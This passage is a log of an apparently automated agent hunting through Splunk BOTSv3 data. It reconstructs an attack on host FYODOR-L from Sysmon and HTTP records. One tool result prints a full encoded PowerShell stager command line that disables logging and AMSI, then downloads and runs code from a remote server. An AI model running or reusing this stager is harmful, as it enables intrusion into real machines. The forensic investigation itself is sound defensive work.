them, don't page: narrow the query with what the question tells you."}}


[STATE:agent_in]  step=1  msgs=26  errors=0  empty=0  verified=True
  last_msg: ToolMessage -> '{"results": [{"uri_path": "/", "dest_ip": "162.144.189.172", "site": "www.weepingradish.com", "status": "200", "http_met'

[Agent thinking]
Intention: The full FYODOR-L HTTP listing (362 rows) is mostly benign brewery/OCSP traffic — I need the dest_ip-scoped view to confirm the 45.77.53.176 path carried only logos.png, and Sysmon EventCode=11 with process details (_time, Image, ProcessGuid) to tie the tool-file creations to a process.



[STATE:verify_in]  step=2  msgs=27  errors=0  empty=0  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"stream:http\" dest_ip=\"45.77.53.176\" | stats count, sum(bytes_out) as total_bytes_out by uri_path, src_ip, http_method, status"})
[Verify OK]     run_splunk_search

[STATE:execute_in]  step=2  msgs=27  errors=0  empty=0  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"stream:http\" dest_ip=\"45.77.53.176\" | stats count, sum(bytes_out) as total_bytes_out by uri_path, src_ip, http_method, status"})
[Execute] run_splunk_search({"query":"index=botsv3 sourcetype=\"stream:http\" dest_ip=\"45.77.53.176\" | stats count, sum(bytes_out) as total_bytes_out by uri_path, src_ip, http_method, status"})
          -> {"results": [{"uri_path": "/images/logos.png", "src_ip": "192.168.70.186", "http_method": "GET", "status": "200", "count": "1", "total_bytes_out": "5542140"}], "meta": {"total_event_count": 1, "returned": 1, "sid": "1790258553.1415"}}


[STATE:agent_in]  step=2  msgs=28  errors=0  empty=0  verified=True
  last_msg: ToolMessage -> '{"results": [{"uri_path": "/images/logos.png", "src_ip": "192.168.70.186", "http_method": "GET", "status": "200", "count'

[Agent response]
Intention: Get the Sysmon file-creation events on FYODOR-L with timestamps and creating-process details (Image, ProcessGuid) to tie the tool files to a process and establish the timeline relative to the 18:47 download.



[WORKER RESULT] Senior-1-Q316: Intention: Get the Sysmon file-creation events on FYODOR-L with timestamps and creating-process details (Image, ProcessGuid) to tie the tool files to a process and establish the timeline relative to t
[s1] report template: missing section '## Prior rounds'; missing section '## Ruled out'

[STATE:agent_in]  step=0  msgs=30  errors=0  empty=0  verified=False
  last_msg: HumanMessage -> '[RETRY] On FYODOR-L, read complete Sysmon EventCode 11 file-creation rows and any paired EventCode 1/3 process/network r'

[Agent thinking]
Intention: Read the complete Sysmon EventCode=11 file-creation rows on FYODOR-L with timestamps and creating-process details (Image, ProcessGuid), to tie the tool files to a process and establish the timeline relative to the 18:47 download.


[STATE:verify_in]  step=1  msgs=31  errors=0  empty=0  verified=False
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" host=\"FYODOR-L\" EventCode=11 | stats count by _time, Image, ProcessGuid, TargetFilename"})
[Verify OK]     run_splunk_search

[STATE:execute_in]  step=1  msgs=31  errors=0  empty=0  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" host=\"FYODOR-L\" EventCode=11 | stats count by _time, Image, ProcessGuid, TargetFilename"})
[Execute] run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" host=\"FYODOR-L\" EventCode=11 | stats count by _time, Image, ProcessGuid, TargetFilename"})
          -> {"results": [{"_time": "2018-08-20T18:01:33.000+08:00", "Image": "C:\\Windows\\system32\\browser_broker.exe", "ProcessGuid": "{EBF7A186-C2DA-5B58-0000-0010B74CC801}", "TargetFilename": "C:\\Users\\FyodorMalteskesko\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\TempState\\Downloads\\BRUCE BIRTHDAY HAPPY HOUR PICS.lnk.gapi8f2.partial", "count": "1"}, {"_time": "2018-08-20T18:01:36.000+08:00", "Image": "C:\\Windows\\SystemApps\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\MicrosoftEdgeCP.exe", "ProcessGuid": "{EBF7A186-C2E2-5B58-0000-00104CE2C801}", "TargetFilename": "C:\\Users\\FyodorMalteskesko\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\TempState\\Downloads\\BRUCE BIRTHDAY HAPPY HOUR PICS (1).lnk.qy8e4dh.partial", "count": "1"}, {"_time": "2018-08-20T18:01:36.000+08:00", "Image": "C:\\Windows\\system32\\browser_broker.exe", "ProcessGuid": "{EBF7A186-C2DA-5B58-0000-0010B74CC801}", "TargetFilename": "C:\\Users\\FyodorMalteskesko\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\TempState\\Downloads\\BRUCE BIRTHDAY HAPPY HOUR PICS (1).lnk.qy8e4dh.partial", "count": "1"}, {"_time": "2018-08-20T18:01:38.000+08:00", "Image": "C:\\Windows\\system32\\browser_broker.exe", "ProcessGuid": "{EBF7A186-C2DA-5B58-0000-0010B74CC801}", "TargetFilename": "C:\\Users\\FyodorMalteskesko\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\TempState\\Downloads\\BRUCE BIRTHDAY HAPPY HOUR PICS (1).lnk.qy8e4dh.partial:Zone.Identifier", "count": "1"}, {"_time": "2018-08-20T18:01:41.000+08:00", "Image": "C:\\Windows\\system32\\browser_broker.exe", "ProcessGuid": "{EBF7A186-C2DA-5B58-0000-0010B74CC801}", "TargetFilename": "C:\\Users\\FyodorMalteskesko\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\TempState\\Downloads\\BRUCE BIRTHDAY HAPPY HOUR PICS (1).lnk", "count": "1"}, {"_time": "2018-08-20T18:01:42.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-C2FD-5B58-0000-00107E5CCA01}", "TargetFilename": "C:\\Users\\FyodorMalteskesko\\AppData\\Local\\Temp\\__PSScriptPolicyTest_equi3wwh.s2h.ps1", "count": "1"}, {"_time": "2018-08-20T18:01:44.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-C300-5B58-0000-001007E5CA01}", "TargetFilename": "C:\\Users\\FyodorMalteskesko\\AppData\\Local\\Temp\\__PSScriptPolicyTest_oiww1jjj.fo5.ps1", "count": "1"}, {"_time": "2018-08-20T18:07:06.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-C442-5B58-0000-001061E4D801}", "TargetFilename": "C:\\Users\\FyodorMalteskesko\\AppData\\Local\\Temp\\__PSScriptPolicyTest_4ysjugtb.32q.ps1", "count": "1"}, {"_time": "2018-08-20T18:07:06.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-C442-5B58-0000-00109914D901}", "TargetFilename": "C:\\Users\\FyodorMalteskesko\\AppData\\Local\\Temp\\__PSScriptPolicyTest_to1mhtq0.dle.ps1", "count": "1"}, {"_time": "2018-08-20T18:09:44.000+08:00", "Image": "c:\\windows\\system32\\svchost.exe", "ProcessGuid": "{EBF7A186-2E72-5B56-0000-001040310100}", "TargetFilename": "C:\\Windows\\System32\\Tasks\\Updater", "count": "1"}, {"_time": "2018-08-20T18:11:00.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-C52C-5B58-0000-0010E061DB01}", "TargetFilename": "C:\\Windows\\Temp\\__PSScriptPolicyTest_swvo5cbn.khc.ps1", "count": "1"}, {"_time": "2018-08-20T18:15:27.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-C637-5B58-0000-0010C01DE001}", "TargetFilename": "C:\\Windows\\Temp\\__PSScriptPolicyTest_gyiame5o.sxw.ps1", "count": "1"}, {"_time": "2018-08-20T18:23:37.000+08:00", "Image": "C:\\Program Files (x86)\\Cisco\\Cisco AnyConnect Secure Mobility Client\\vpnagent.exe", "ProcessGuid": "{EBF7A186-C821-5B58-0000-00100838E901}", "TargetFilename": "C:\\Windows\\System32\\drivers\\etc\\hosts.ac.tmp", "count": "1"}, {"_time": "2018-08-20T18:23:53.000+08:00", "Image": "C:\\Program Files (x86)\\Cisco\\Cisco AnyConnect Secure Mobility Client\\vpnagent.exe", "ProcessGuid": "{EBF7A186-C821-5B58-0000-00100838E901}", "TargetFilename": "C:\\Windows\\System32\\drivers\\etc\\hosts.ac.tmp", "count": "1"}, {"_time": "2018-08-20T18:28:37.000+08:00", "Image": "C:\\Program Files (x86)\\Cisco\\Cisco AnyConnect Secure Mobility Client\\vpnagent.exe", "ProcessGuid": "{EBF7A186-C821-5B58-0000-00100838E901}", "TargetFilename": "C:\\Windows\\System32\\drivers\\etc\\hosts.ac.tmp", "count": "1"}, {"_time": "2018-08-20T18:42:49.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-C442-5B58-0000-00109914D901}", "TargetFilename": "C:\\Windows\\Temp\\hdoor.exe", "count": "1"}, {"_time": "2018-08-20T18:47:41.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-C442-5B58-0000-00109914D901}", "TargetFilename": "C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe", "count": "1"}, {"_time": "2018-08-20T18:47:41.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-C442-5B58-0000-00109914D901}", "TargetFilename": "C:\\Windows\\Temp\\unziped\\lsof-master\\powershell.exe", "count": "1"}, {"_time": "2018-08-20T19:32:13.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-D8AD-5B58-0000-0010D6D03D02}", "TargetFilename": "C:\\Users\\FyodorMalteskesko\\AppData\\Local\\Temp\\__PSScriptPolicyTest_m4mweu01.w0d.ps1", "count": "1"}, {"_time": "2018-08-20T19:32:13.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-D8AE-5B58-0000-00108E083E02}", "TargetFilename": "C:\\Users\\FyodorMalteskesko\\AppData\\Local\\Temp\\__PSScriptPolicyTest_pmhyaqar.n3i.ps1", "count": "1"}, {"_time": "2018-08-20T19:34:24.000+08:00", "Image": "C:\\Windows\\system32\\cleanmgr.exe", "ProcessGuid": "{EBF7A186-D930-5B58-0000-001080F83F02}", "TargetFilename": "C:\\Users\\FYODOR~1\\AppData\\Local\\Temp\\3F5D15FE-AD68-4E1F-B3C4-90E199AF3640\\DismHost.exe", "count": "1"}], "meta": {"total_event_count": 21, "returned": 21, "sid": "1790258571.1416"}}


[STATE:agent_in]  step=1  msgs=32  errors=0  empty=0  verified=True
  last_msg: ToolMessage -> '{"results": [{"_time": "2018-08-20T18:01:33.000+08:00", "Image": "C:\\\\Windows\\\\system32\\\\browser_broker.exe", "ProcessGu'

[Agent thinking]
Intention: The timeline is now clear: hdoor.exe at 18:42:49, network connection to 45.77.53.176:3333 at 18:47:06, GET logos.png at 18:47:16, then iexepler.exe and powershell.exe created in unziped\lsof-master\ at 18:47:41 — all by the SAME PowerShell ProcessGuid. Now I need the command line of that process to tie the retrieval to the extraction.


[STATE:verify_in]  step=2  msgs=33  errors=0  empty=0  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" host=\"FYODOR-L\" ProcessGuid=\"{EBF7A186-C442-5B58-0000-00109914D901}\" EventCode=1 | stats count by _time, Image, CommandLine, ParentImage"})
[Verify OK]     run_splunk_search

[STATE:execute_in]  step=2  msgs=33  errors=0  empty=0  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" host=\"FYODOR-L\" ProcessGuid=\"{EBF7A186-C442-5B58-0000-00109914D901}\" EventCode=1 | stats count by _time, Image, CommandLine, ParentImage"})
[Execute] run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" host=\"FYODOR-L\" ProcessGuid=\"{EBF7A186-C442-5B58-0000-00109914D901}\" EventCode=1 | stats count by _time, Image, CommandLine, ParentImage"})
          -> {"results": [{"_time": "2018-08-20T18:07:06.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoP -NonI -W Hidden -enc SQBmACgAJABQAFMAVgBFAHIAUwBJAG8AbgBUAGEAYgBsAEUALgBQAFMAVgBlAFIAUwBJAG8AbgAuAE0AQQBKAE8AUgAgAC0AZwBFACAAMwApAHsAJABHAFAARgA9AFsAcgBFAGYAXQAuAEEAUwBTAGUAbQBCAGwAWQAuAEcARQBUAFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAEkARQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAdABWAEEATAB1AEUAKAAkAG4AdQBsAGwAKQA7AEkAZgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAYQBsAD0AWwBDAG8AbABsAGUAYwB0AGkAbwBOAHMALgBHAGUATgBlAFIASQBDAC4ARABpAEMAdABJAG8AbgBhAFIAeQBbAFMAVAByAGkAbgBnACwAUwB5AFMAdABFAE0ALgBPAEIAagBlAGMAdABdAF0AOgA6AE4AZQBXACgAKQA7ACQAdgBhAEwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAdgBhAGwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAEEAbAB9AEUAbABzAGUAewBbAFMAQwBSAEkAcABUAEIATABvAEMASwBdAC4AIgBHAGUAVABGAGkAZQBgAGwAZAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBBAEwAdQBFACgAJABOAFUAbABsACwAKABOAEUAVwAtAE8AQgBKAEUAYwBUACAAQwBPAGwATABFAEMAVABJAE8ATgBTAC4ARwBlAG4ARQByAGkAQwAuAEgAQQBTAEgAUwBFAFQAWwBzAFQAUgBpAG4ARwBdACkAKQB9ACQAUgBlAEYAPQBbAFIARQBGAF0ALgBBAFMAcwBFAE0AQgBMAFkALgBHAGUAVABUAFkAcABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQBVAHQAaQBsAHMAJwApADsAJABSAEUAZgAuAEcAZQBUAEYAaQBFAGwAZAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAHQAVgBhAEwAdQBFACgAJABuAFUATABMACwAJAB0AHIAVQBFACkAOwB9ADsAWwBTAFkAcwBUAEUATQAuAE4AZQBUAC4AUwBFAFIAVgBJAGMARQBQAG8ASQBOAFQATQBhAE4AYQBHAEUAUgBdADoAOgBFAFgAUABlAEMAdAAxADAAMABDAE8AbgB0AGkAbgBVAEUAPQAwADsAJAB3AEMAPQBOAGUAdwAtAE8AQgBKAGUAQwB0ACAAUwBZAHMAVABlAE0ALgBOAEUAdAAuAFcAZQBiAEMATABpAEUATgBUADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAHIAdgBlAHIAQwBlAHIAdABpAGYAaQBjAGEAdABlAFYAYQBsAGkAZABhAHQAaQBvAG4AQwBhAGwAbABiAGEAYwBrACAAPQAgAHsAJAB0AHIAdQBlAH0AOwAkAFcAQwAuAEgARQBBAGQAZQBSAHMALgBBAGQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAYwAuAEgARQBhAGQARQBSAHMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAYwAuAFAAUgBvAFgAeQA9AFsAUwB5AFMAdABlAG0ALgBOAEUAVAAuAFcAZQBCAFIAZQBxAFUARQBTAHQAXQA6ADoARABlAGYAYQBVAGwAVABXAEUAYgBQAHIAbwBYAHkAOwAkAFcAQwAuAFAAcgBvAHgAWQAuAEMAUgBlAGQAZQBOAFQAaQBBAEwAcwAgAD0AIABbAFMAWQBzAFQAZQBtAC4ATgBFAHQALgBDAHIAZQBEAGUATgBUAGkAQQBMAEMAYQBjAEgAZQBdADoAOgBEAGUAZgBhAFUAbABUAE4ARQB0AFcAbwByAGsAQwByAEUAZABlAG4AdABpAGEATABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAFMAVABlAE0ALgBUAGUAeABUAC4ARQBuAEMATwBkAGkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQBUAEIAWQBUAEUAUwAoACcAMQBBAEIAPABZAGsANgBaADQAIwArAHYAVgB1ACUAbwA1AH0AOAAmAE0ALQA5AFUATAB+AGwAfAA+ADAAZwBQACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIAZwBzADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAFUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAkACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAEkAbgBnAF0AOgA6AFUAbgBJAGMATwBEAEUALgBHAEUAdABTAFQAcgBpAG4ARwAoAFsAQwBvAG4AdgBFAFIAdABdADoAOgBGAHIAbwBNAEIAQQBzAGUANgA0AFMAdAByAGkATgBHACgAJwBhAEEAQgAwAEEASABRAEEAYwBBAEIAegBBAEQAbwBBAEwAdwBBAHYAQQBEAFEAQQBOAFEAQQB1AEEARABjAEEATgB3AEEAdQBBAEQAVQBBAE0AdwBBAHUAQQBEAEUAQQBOAHcAQQAyAEEARABvAEEATgBBAEEAMABBAEQATQBBACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJABXAEMALgBIAEUAYQBEAEUAcgBTAC4AQQBkAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAFAAdABoAEEAVgBnAHMAPQBoAEIAMgBIADAARwBUAEkAcAB3AHgAQwBlAEwAaABHAGUALwBmAEwAawBmAEIAcABDAGQASQA9ACIAKQA7ACQAZABhAFQAQQA9ACQAdwBDAC4ARABPAFcAbgBsAG8AQQBkAEQAQQB0AEEAKAAkAHMARQByACsAJAB0ACkAOwAkAGkAdgA9ACQAZABBAFQAQQBbADAALgAuADMAXQA7ACQARABhAFQAYQA9ACQAZABhAFQAQQBbADQALgAuACQARABhAHQAYQAuAGwARQBOAEcAVABIAF0AOwAtAGoAbwBpAE4AWwBDAGgAQQByAFsAXQBdACgAJgAgACQAUgAgACQARABhAFQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA", "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "count": "1"}], "meta": {"total_event_count": 1, "returned": 1, "sid": "1790258581.1417"}}


[STATE:agent_in]  step=2  msgs=34  errors=0  empty=0  verified=True
  last_msg: ToolMessage -> '{"results": [{"_time": "2018-08-20T18:07:06.000+08:00", "Image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powers'

[Agent thinking]
Intention: The timeline is now solid — the same PowerShell process (Empire agent, ProcessGuid C442...D901) created hdoor.exe at 18:42:49, connected to 45.77.53.176:3333 at 18:47:06, and created the unziped\lsof-master tools at 18:47:41. Now I need to (a) confirm the 18:47:06 connection was made by that same ProcessGuid, and (b) find where logos.png was written and any child-process command lines showing the download/extract.



[STATE:verify_in]  step=3  msgs=35  errors=0  empty=0  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" host=\"FYODOR-L\" EventCode=3 DestinationIp=\"45.77.53.176\" | stats count by _time, Image, ProcessGuid, DestinationPort, DestinationHostname"})
[Verify OK]     run_splunk_search

[STATE:execute_in]  step=3  msgs=35  errors=0  empty=0  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" host=\"FYODOR-L\" EventCode=3 DestinationIp=\"45.77.53.176\" | stats count by _time, Image, ProcessGuid, DestinationPort, DestinationHostname"})
[Execute] run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" host=\"FYODOR-L\" EventCode=3 DestinationIp=\"45.77.53.176\" | stats count by _time, Image, ProcessGuid, DestinationPort, DestinationHostname"})
          -> {"results": [{"_time": "2018-08-20T18:01:55.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-C300-5B58-0000-001007E5CA01}", "DestinationPort": "443", "DestinationHostname": "45.77.53.176.vultr.com", "count": "1"}, {"_time": "2018-08-20T18:02:00.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-C300-5B58-0000-001007E5CA01}", "DestinationPort": "443", "DestinationHostname": "45.77.53.176.vultr.com", "count": "1"}, {"_time": "2018-08-20T18:02:06.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-C300-5B58-0000-001007E5CA01}", "DestinationPort": "443", "DestinationHostname": "45.77.53.176.vultr.com", "count": "1"}, {"_time": "2018-08-20T18:02:12.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-C300-5B58-0000-001007E5CA01}", "DestinationPort": "443", "DestinationHostname": "45.77.53.176.vultr.com", "count": "1"}, {"_time": "2018-08-20T18:02:17.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-C300-5B58-0000-001007E5CA01}", "DestinationPort": "443", "DestinationHostname": "45.77.53.176.vultr.com", "count": "1"}, {"_time": "2018-08-20T18:02:23.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-C300-5B58-0000-001007E5CA01}", "DestinationPort": "443", "DestinationHostname": "45.77.53.176.vultr.com", "count": "1"}, {"_time": "2018-08-20T18:02:29.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-C300-5B58-0000-001007E5CA01}", "DestinationPort": "443", "DestinationHostname": "45.77.53.176.vultr.com", "count": "1"}, {"_time": "2018-08-20T18:02:35.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-C300-5B58-0000-001007E5CA01}", "DestinationPort": "443", "DestinationHostname": "45.77.53.176.vultr.com", "count": "1"}, {"_time": "2018-08-20T18:02:43.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-C300-5B58-0000-001007E5CA01}", "DestinationPort": "443", "DestinationHostname": "45.77.53.176.vultr.com", "count": "1"}, {"_time": "2018-08-20T18:02:49.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-C300-5B58-0000-001007E5CA01}", "DestinationPort": "443", "DestinationHostname": "45.77.53.176.vultr.com", "count": "1"}, {"_time": "2018-08-20T18:02:54.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-C300-5B58-0000-001007E5CA01}", "DestinationPort": "443", "DestinationHostname": "45.77.53.176.vultr.com", "count": "1"}, {"_time": "2018-08-20T18:03:00.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-C300-5B58-0000-001007E5CA01}", "DestinationPort": "443", "DestinationHostname": "45.77.53.176.vultr.com", "count": "1"}, {"_time": "2018-08-20T18:03:06.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-C300-5B58-0000-001007E5CA01}", "DestinationPort": "443", "DestinationHostname": "45.77.53.176.vultr.com", "count": "1"}, 